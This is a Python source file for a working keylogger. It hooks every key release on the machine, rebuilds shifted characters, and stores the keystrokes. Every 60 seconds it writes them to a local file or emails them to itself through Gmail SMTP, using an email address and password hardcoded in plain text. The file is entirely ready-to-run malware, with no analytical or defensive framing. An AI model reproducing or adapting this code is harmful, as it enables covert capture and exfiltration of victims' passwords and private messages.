import keyboard
import smtplib
from threading import Timer
from datetime import datetime

REPORT_FREQUENCY = 60 #seconds
EMAIL_ADDRESS = "jakspare777@gmail.com"
PASSWORD = "swordfish12345$"

class Keylogger:
	def __init__(self, time_period, report_method):
		self.time_period = time_period
		self.report_method = report_method
		#this will store keystrokes that are logged
		self.log = ""
		self.start_time = datetime.now()
		self.end_time = datetime.now()

	#callback function for every keypress to process and add to the log
	def keypress_callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == "space":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		if keyboard.is_pressed("shift") and name == "1":
			name = "!"
		if keyboard.is_pressed("shift") and name == "2":
			name = "@"
		if keyboard.is_pressed("shift") and name == "3":
			name = "#"
		if keyboard.is_pressed("shift") and name == "4":
			name = "$"
		if keyboard.is_pressed("shift") and name == "5":
			name = "%"
		if keyboard.is_pressed("shift") and name == "6":
			name = "^"
		if keyboard.is_pressed("shift") and name == "7":
			name = "&"
		if keyboard.is_pressed("shift") and name == "8":
			name = "*"
		if keyboard.is_pressed("shift") and name == "9":
			name = "("
		if keyboard.is_pressed("shift") and name == "0":
			name = ")"
		if keyboard.is_pressed("shift") and name == ",":
			name = "<"
		if keyboard.is_pressed("shift") and name == ".":
			name = ">"
		if keyboard.is_pressed("shift") and name == "-":
			name = "_"
		if keyboard.is_pressed("shift") and name == "=":
			name = "+"
		if keyboard.is_pressed("shift") and name == ";":
			name = ":"
		if keyboard.is_pressed("shift") and name == "'":
			name = "\""
		if keyboard.is_pressed("shift") and name == "/":
			name = "?"
		if keyboard.is_pressed("shift") and name == "\\":
			name = "|"
		if keyboard.is_pressed("shift") and name == "`":
			name = "~"
		if keyboard.is_pressed("shift"):
			name = name.upper()
		self.log += name

	def report_to_email(self, email, password, message):
		print("sending email...")
		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def generate_filename(self):
		start_time_str = str(self.start_time)[:-7].replace(" ", "-").replace(":", "")
		end_time_str = str(self.end_time)[:-7].replace(" ", "-").replace(":", "")
		self.filename = f"keylog-output-{start_time_str}_{end_time_str}"

	def report_to_local_file(self):
		with open(f"{self.filename}.txt", "w") as f:
			print(self.log, file=f)
		print(f"saved to {self.filename}.txt")

	def report(self):
		#print("30 seconds have passed...")
		if self.log:
			self.end_time = datetime.now()
			self.generate_filename()
			if self.report_method == "file":
				self.report_to_local_file()
			elif self.report_method == "email":
				self.report_to_email(EMAIL_ADDRESS, PASSWORD, self.log)
			self.start_time = datetime.now()
		self.log = ""
		timer = Timer(interval = self.time_period, function=self.report)
		timer.daemon = True
		timer.start()

	def start(self):
		self.start_dt = datetime.now()
		keyboard.on_release(callback=self.keypress_callback)
		self.report()
		keyboard.wait()

if __name__ == "__main__":
	keylogger = Keylogger(time_period=REPORT_FREQUENCY, report_method = "file")
	keylogger.start()
